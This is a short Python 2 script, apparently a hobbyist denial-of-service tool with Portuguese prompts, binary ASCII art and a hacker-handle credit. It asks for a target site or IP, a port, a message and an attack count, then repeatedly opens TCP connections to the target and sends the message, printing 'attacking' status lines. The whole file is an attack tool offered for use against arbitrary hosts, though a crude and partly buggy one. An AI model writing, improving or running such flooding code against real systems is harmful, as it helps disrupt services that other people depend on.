 
import time
import socket
import os
import sys
import string
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
os.system("clear")
print 
print "                               10100111010101010101010"
print "                      101010010010011101010100100010010001010"
print "                 0101001010101010010101010101001010000100111100"
print "                        11101101010010101010100101001001010101"    
print "                          1010100101010100101010101101"
print "                              10101010101010101010101" 
print "                                 10010011010010010      101001010100"
print "                10100100100110      11001010010101     10010010010101"
print "               1010010101010010   100101001001001   1010101010100101"
print "               1010010010010100100101010101011 1101010100101"
print "                                 1010101010101010"
print "                               10 101010101010101 10"
print "             10101          101010101010101001010101010101001010011101"
print "            10101010101010101001010101010101001110101010010101010101010"
print "            1010101001001110101010101010101010101010010101010100101011"
print "            0101010101001010101010101010101010101010101010101110100101"
print "              000010101010010010010101010010101100101010101010101010"
print "                 1010101010011001001001010101010111010100"
print "                     1111010101010101001010101010101010101001    01"
print "               1 0    0101010101010  10101010   101010101010    110"
print "                101     010101010111            010100         001"
print "                 0110                                        0011"
print "                  110011               0000              010 100"
print "                   01010100101101010100      1010110100100  110"
print "                     101010101010100010101001010101001    1100"
print "                      011010101010             11010101 1010"  
print "                       1010101010011         11001010101010"
print "                        10101010010         1010101010111"
print "                         10101010101        101010101010"  
print "                             10101010        01010101011"
print "                               101011        10101001"
print "                                  110        100"
print 
print "                                  #AnonymoThugLife"
print "                                  #AnonymoThugLife"
print "                                  #AnonymoThugLife"
print "LifeAuthor : @AnonymoThugLife"
print "GitHub : https://github.com/AnonymoThugLife"
print
host=raw_input( "Digite o Site ou IP: " )
port=input( "Porta: " )
message=raw_input( "Mensagem para enviar: " )
conn=input( "Numeros(s) de Ataque(s): " )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[IP Trancado]" )
print ( "[Atacando " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("| --[Ataque Falhou]--|")
    print ( "|--[Ataque colcuido]--|")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("Attack(s) Finished")
if __name__ == "__main__":
    answer = raw_input("Restart?(Y/n) ")
    if answer.strip() in "y Y yes Yes YES".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")